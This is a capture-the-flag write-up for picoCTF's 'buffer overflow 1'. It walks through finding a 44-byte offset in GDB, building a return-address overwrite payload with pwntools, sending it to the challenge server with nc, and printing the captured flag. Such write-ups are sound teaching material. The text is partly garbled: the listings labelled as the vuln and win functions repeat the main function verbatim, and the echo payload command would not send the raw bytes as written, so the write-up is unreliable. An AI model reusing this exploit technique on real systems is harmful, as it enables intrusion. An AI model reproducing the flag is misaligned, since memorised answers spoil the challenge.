# Writeup: buffer overflow 1

# Overview

This challenge involves exploiting a simple buffer overflow to change the return address.

## Analysis

### Code Overview

- The `main` function prompts user to input a string:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

- The `vuln` function receives a string using `gets` function:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

- The `win` function output the flag:

```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

### Vulnerabilities

1. The `gets` function does not check bounds, leading to a buffer overflow vulnerability.

## Exploitation Strategy

Since the program does not call the `win` function directly, we need to change the return address of the  `vuln` function to the address of the `win` function.

1. Determine the offset of the buffer overflow.

2. Perform a buffer overflow to overwrite the return address with the address of the `win` the function.

## Exploitation Steps

1. Determine the offset of the buffer:

- Run the program using GDB:

```terminal
$ gdb vuln
```

- Create a string using `pattern create` command:

```terminal
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  run
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

- A segmentation fault occur. Observe the value of `$eip` which is instruction pointer:

```terminal
$eip   : 0x6161616c ("laaa"?)
```

- Determine the offset of the buffer using `pattern offset` command:

```terminal
gef➤  pattern offset l
[+] Searching for '6c'/'6c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

- The offset is 44 bytes.

2. Craft the payload using `Python`:

- Determine the address of the `win` function:

```terminal
gef➤  disas win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   ebp
```

- The `win` function starts at the address `0x080491fa`.

- Craft the payload:

```terminal
$ python
>>> from pwn import *
>>> print ('A'*44)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> p32(0x080491fa)
b'\xfa\x91\x04\x08'
```

3. Perform buffer overflow:

```terminal
$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfa\x91\x04\x08' | nc saturn.picoctf.net 55068
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491fa
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
```

## Conclusion

This challenge demonstrates how to exploit a buffer overflow vulnerability to overwrite the return address and redirect execution to a specific function, in this case, the `win` function, to retrieve the flag.

